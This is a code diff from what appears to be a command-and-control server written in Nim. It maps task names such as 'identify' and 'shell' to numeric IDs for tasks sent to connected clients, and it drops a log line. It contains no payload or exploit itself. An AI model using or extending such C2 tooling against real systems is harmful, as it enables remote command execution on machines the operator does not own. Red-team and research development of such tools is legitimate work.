@@ -1,16 +1,24 @@
-import std/asyncdispatch
+import std/[asyncdispatch, tables]
 
 import types, logging, events
+
+let id_s: Table[string, int] = {
+  "identify": 0,
+  "shell": 7,
+}.toTable
 
 proc sendClientTask*(client: C2Client, taskName: string, arguments: seq[string] = @[]): Future[Task] {.async.} =
   if not client.connected:
     errorLog "can't send task to disconnected client: " & $client
     return
 
+  let task_id: int = id_s[taskName]
+
   let createdTask = Task(
     client: client,
     id: len(client.server.tasks),
-    action: taskName,
+    action: task_id,
+    actionName: taskName,
     status: TaskCreated,
     arguments: arguments,
     future: new (ref Future[void]),
@@ -20,9 +28,9 @@ proc sendClientTask*(client: C2Client, taskName: string, arguments: seq[string] 
   client.server.tasks.add(createdTask)
   
   onClientTasked(client, createdTask)
-  infoLog "tasked " & $client & " with " & taskName
   prompt(client.server)
   return createdTask
+
 
 proc awaitResponse*(task: Task): Future[void] =
   task.client.server.cli.waitingForOutput = true
